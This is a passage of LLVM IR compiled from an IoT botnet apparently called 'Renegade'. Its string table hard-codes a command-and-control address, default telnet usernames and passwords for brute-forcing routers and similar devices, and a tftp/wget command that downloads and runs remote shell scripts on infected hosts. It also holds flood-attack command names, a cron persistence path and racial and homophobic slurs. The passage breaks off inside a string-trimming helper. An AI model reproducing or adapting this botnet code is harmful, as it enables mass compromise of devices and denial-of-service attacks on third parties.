; ModuleID = 'host/ir_O2/Renegade.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"94.140.120.196:23913\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [10 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.10 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = local_unnamed_addr global [18 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.11 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"letmein\00\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"epicrouter\00\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.85 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.20 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [193 x i8] c"cd /tmp || cd /var/run;rm -f ng.sh gchq.sh;tftp -r ng.sh -g 94.140.120.196;chmod +x ng.sh;sh ng.sh;rm -f ng.sh;wget -q http://94.140.120.196/gchq.sh;chmod +x gchq.sh;sh gchq.sh;rm -f gchq.sh\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"as\00", align 1
@.str.43 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"shell exec\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.46 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.49 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.51 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.52 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.53 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.55 = private unnamed_addr constant [17 x i8] c"wget -O /tmp/fff\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.58 = private unnamed_addr constant [14 x i8] c"FUCKINGFAGGOT\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.63 = private unnamed_addr constant [33 x i8] c"SCANNER SSH/TEL ON | SSH/TEL OFF\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.65 = private unnamed_addr constant [10 x i8] c"tel d0rk\0A\00", align 1
@.str.66 = private unnamed_addr constant [7 x i8] c"TEL ON\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"tel f0rk\0A\00", align 1
@.str.68 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.75 = private unnamed_addr constant [13 x i8] c"LUCKYLILDUDE\00", align 1
@.str.76 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.77 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@main.ismokeweed = private unnamed_addr constant [50 x i8] c"/etc/cron.hourly/sockaddr\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@main.r00t3d = private unnamed_addr constant [11 x i8] c"shell exec\00", align 1
@.str.79 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"FUCKYOU\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"GUCCILILNIGGA\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ipState.1 = internal unnamed_addr global i8 0, align 1
@ipState.2 = internal unnamed_addr global i8 0, align 1
@ipState.3 = internal unnamed_addr global i8 0, align 1
@ipState.4 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !4
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !4
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !7, !noalias !4
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !7, !noalias !4
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !9

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !4
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !4
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !7, !noalias !4
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !7, !noalias !4
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !4
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !4
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !7, !noalias !4
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !7, !noalias !4
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !4
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !4
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !7, !noalias !4
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !7, !noalias !4
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !4
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !4
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !7, !noalias !4
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !7, !noalias !4
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #14
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
